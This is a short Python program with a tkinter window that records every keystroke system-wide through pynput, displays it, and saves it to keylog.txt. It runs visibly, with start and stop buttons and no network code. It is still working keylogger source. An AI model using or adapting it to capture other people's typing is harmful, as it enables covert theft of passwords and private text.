import tkinter as tk
from pynput import keyboard

class KeyloggerUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger")
        
        self.log_label = tk.Label(master, text="Keylogger Log:")
        self.log_label.pack()

        self.log_text = tk.Text(master, height=10, width=50)
        self.log_text.pack()

        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack()

        self.listener = None
        self.log = ""

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f" {key} "

        self.update_log()

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_keylogger()

    def start_keylogger(self):
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.save_log()

    def update_log(self):
        self.log_text.delete("1.0", tk.END)
        self.log_text.insert(tk.END, self.log)

    def save_log(self):
        with open("keylog.txt", "w") as file:
            file.write(self.log)
        print("Keylog saved to keylog.txt")

def main():
    root = tk.Tk()
    app = KeyloggerUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
